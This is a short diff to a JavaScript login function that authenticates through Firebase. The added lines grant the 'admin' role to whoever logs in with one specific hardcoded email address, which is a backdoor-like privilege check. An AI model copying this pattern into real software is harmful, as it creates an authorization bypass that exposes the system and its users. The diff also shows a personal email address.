@@ -32,7 +32,10 @@ export async function AccountLogin(params) {
     status = 'error'
     console.log("Firebase login failed. error code: ", error.code, " message: ", error.message)
   });
+  
   const ret = await loginpromise
+  if(params.email=="liualbert1@gmail.com")
+    currentAuthority = 'admin'
   console.log('Complete firebase authentication. ret:', ret)
   return ({status, type, currentAuthority})
   //return
